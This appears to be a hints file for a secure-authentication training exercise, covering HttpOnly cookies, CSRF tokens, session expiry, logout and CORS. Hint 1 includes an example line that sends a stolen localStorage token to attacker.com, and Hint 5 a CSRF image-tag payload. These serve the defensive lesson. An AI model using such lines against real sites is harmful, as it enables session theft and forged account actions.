# Hints - Exercise 2: Secure Authentication Implementation

## General Understanding

### Hint 1: Why localStorage is Insecure for Tokens

**Problem:** JavaScript can access localStorage
```javascript
// Any script on your page can do this:
const token = localStorage.getItem('authToken');
fetch('https://attacker.com/steal?token=' + token);
```

**If XSS exists** (like the one from Exercise 1), attacker steals all tokens!

---

### Hint 2: HttpOnly Cookies Solution

**HttpOnly cookies** cannot be accessed by JavaScript:

```javascript
// This returns the session cookie (if not HttpOnly):
document.cookie

// With HttpOnly: session cookie is invisible to JavaScript
```

---

## Fix #1: localStorage → HttpOnly Cookies

### Hint 3: Backend - Setting HttpOnly Cookie

Update `server/index.js` in the login endpoint:

```javascript
// ❌ Remove this
res.json({ token, user });

// ✅ Add this
res.cookie('session', sessionToken, {
  httpOnly: true,      // Cannot access with JavaScript
  secure: true,        // HTTPS only (use false for localhost)
  sameSite: 'strict',  // CSRF protection
  maxAge: 3600000      // 1 hour
});

res.json({ user, csrfToken });
```

### Hint 4: Frontend - Remove localStorage

Update `src/services/authService.js`:

```javascript
// ❌ Remove all localStorage code
// localStorage.setItem('authToken', token);
// localStorage.getItem('authToken');
// localStorage.removeItem('authToken');

// ✅ Add credentials to fetch
fetch('/api/auth/login', {
  credentials: 'include'  // Automatically send cookies
});
```

---

## Fix #2: CSRF Protection

### Hint 5: What is CSRF?

**Cross-Site Request Forgery:** Attacker tricks browser into making requests:

```html
<!-- Attacker's website -->
<img src="http://yoursite.com/api/delete-account">
<!-- Your browser sends your cookies! -->
```

### Hint 6: CSRF Token Solution

**Backend generates token:**
```javascript
import crypto from 'crypto';

const csrfToken = crypto.randomBytes(32).toString('hex');

sessions.set(sessionToken, {
  userId: user.id,
  csrfToken  // Store with session
});

// Return to client
res.json({ user, csrfToken });
```

### Hint 7: Client Stores CSRF in Memory

```javascript
// ✅ In memory (not localStorage!)
let csrfToken = null;

// On login
const { user, csrfToken: token } = await response.json();
csrfToken = token;

// Include in requests
fetch('/api/endpoint', {
  headers: {
    'X-CSRF-Token': csrfToken
  }
});
```

### Hint 8: Server Verifies CSRF

```javascript
function verifyCsrf(req, res, next) {
  const csrfToken = req.headers['x-csrf-token'];

  if (csrfToken !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  next();
}

// Use in routes
app.post('/api/logout', requireAuth, verifyCsrf, (req, res) => {
  // Protected!
});
```

---

## Fix #3: Session Expiration

### Hint 9: Track Session Creation

```javascript
sessions.set(sessionToken, {
  userId: user.id,
  csrfToken,
  createdAt: Date.now()  // ✅ Track time
});
```

### Hint 10: Check Expiration

```javascript
function requireAuth(req, res, next) {
  const sessionToken = req.cookies.session;
  const session = sessions.get(sessionToken);

  const SESSION_DURATION = 60 * 60 * 1000; // 1 hour

  // ✅ Check if expired
  if (Date.now() - session.createdAt > SESSION_DURATION) {
    sessions.delete(sessionToken);
    res.clearCookie('session');
    return res.status(401).json({ error: 'Session expired' });
  }

  req.session = session;
  next();
}
```

### Hint 11: Automatic Cleanup

```javascript
// Clean up expired sessions every 15 minutes
setInterval(() => {
  const now = Date.now();
  for (const [token, session] of sessions.entries()) {
    if (now - session.createdAt > SESSION_DURATION) {
      sessions.delete(token);
    }
  }
}, 15 * 60 * 1000);
```

---

## Fix #4: Proper Logout

### Hint 12: Server-Side Session Deletion

```javascript
// ❌ Starter does this (wrong!)
app.post('/api/auth/logout', (req, res) => {
  // sessions.delete(token); // Commented out!
  res.json({ message: 'Logged out' });
});

// ✅ Actually delete the session
app.post('/api/auth/logout', requireAuth, verifyCsrf, (req, res) => {
  const sessionToken = req.cookies.session;

  sessions.delete(sessionToken);  // ✅ Delete!
  res.clearCookie('session');

  res.json({ message: 'Logged out' });
});
```

### Hint 13: Frontend Logout

```javascript
logout: async () => {
  try {
    await fetch('/api/auth/logout', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'X-CSRF-Token': csrfToken
      }
    });
  } finally {
    csrfToken = null;
  }
}
```

---

## Fix #5: CORS Configuration

### Hint 14: Specific Origin Only

```javascript
// ❌ Allows any origin
app.use(cors({
  origin: true  // BAD!
}));

// ✅ Specific origin
app.use(cors({
  origin: 'http://localhost:5173',  // Your frontend URL
  credentials: true                 // Allow cookies
}));
```

---

## Testing Your Fixes

### Test 1: HttpOnly Cookie

```javascript
// After fixing, in browser console:
console.log(localStorage.getItem('authToken'));
// Should output: null ✅

console.log(document.cookie);
// Should NOT show session cookie ✅
```

### Test 2: Session Expiration

1. Login
2. Wait 1 hour (or change SESSION_DURATION to 10 seconds for testing)
3. Try to access protected route
4. Should be logged out ✅

### Test 3: Proper Logout

```javascript
// Before fixing:
// 1. Login
// 2. Copy token: localStorage.getItem('authToken')
// 3. Logout
// 4. Paste token back: localStorage.setItem('authToken', '...')
// 5. Reload - Still logged in ❌

// After fixing:
// Cannot access token anymore ✅
// Logout invalidates server session ✅
```

### Test 4: CSRF Protection

```javascript
// Without CSRF token:
fetch('/api/logout', {
  method: 'POST',
  credentials: 'include'
  // No X-CSRF-Token header
});
// Should return 403 Forbidden ✅
```

---

## Common Mistakes

### ❌ Mistake 1: Forgetting credentials

```javascript
// BAD
fetch('/api/login', {
  method: 'POST'
  // Missing: credentials: 'include'
});

// Cookies won't be sent/received!
```

### ❌ Mistake 2: CSRF Token in localStorage

```javascript
// BAD
localStorage.setItem('csrfToken', token);

// If XSS exists, attacker can steal CSRF token!
// Store in memory or state instead
```

### ❌ Mistake 3: Not Using Secure in Development

```javascript
// For localhost (HTTP):
secure: false  // or: secure: process.env.NODE_ENV === 'production'

// HTTPS cookies won't work on localhost!
```

---

## Step-by-Step Implementation

### Step 1: Fix Backend Login

1. Import `crypto`
2. Generate session token and CSRF token
3. Set HttpOnly cookie
4. Return user + CSRF token (not session token)

### Step 2: Fix Frontend Login

1. Remove localStorage code
2. Add `credentials: 'include'`
3. Store CSRF token in memory
4. Update useAuth hook

### Step 3: Add Session Expiration

1. Store `createdAt` with session
2. Check expiration in `requireAuth` middleware
3. Add cleanup interval

### Step 4: Fix Logout

1. Backend: Actually delete session
2. Backend: Clear cookie
3. Frontend: Call backend logout
4. Frontend: Clear CSRF token

### Step 5: Add CSRF Protection

1. Generate CSRF token on login
2. Create `verifyCsrf` middleware
3. Apply to state-changing routes
4. Include token in frontend requests

### Step 6: Test Everything

- [ ] No tokens in localStorage
- [ ] Session cookie is HttpOnly
- [ ] Sessions expire
- [ ] Logout works
- [ ] CSRF protection works

---

## Resources

- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [SameSite Cookies Explained](https://web.dev/samesite-cookies-explained/)

---

**Keep going! Secure authentication is complex but critical!** 🔒

